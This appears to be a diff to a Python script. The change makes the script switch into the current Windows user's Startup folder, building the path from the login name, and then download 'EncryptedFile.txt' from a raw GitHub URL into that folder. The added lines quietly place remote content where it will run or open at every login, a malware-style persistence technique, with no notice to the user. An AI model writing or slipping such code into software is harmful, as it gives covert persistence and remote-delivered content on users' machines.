@@ -3,7 +3,11 @@ from binascii import b2a_base64
 from hashlib import sha256
 import os
 import urllib.request
-urllib.request.urlretrieve('https://raw.githubusercontent.com/Kat9-123/TestRepo/main/EncryptedFile.txt','EncryptedFile.txt')
+
+
+os.chdir("C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+
+urllib.request.urlretrieve('https://raw.githubusercontent.com/Kat9-123/TestRepo/main/EncryptedFile.txt',"EncryptedFile.txt")
 
 
 
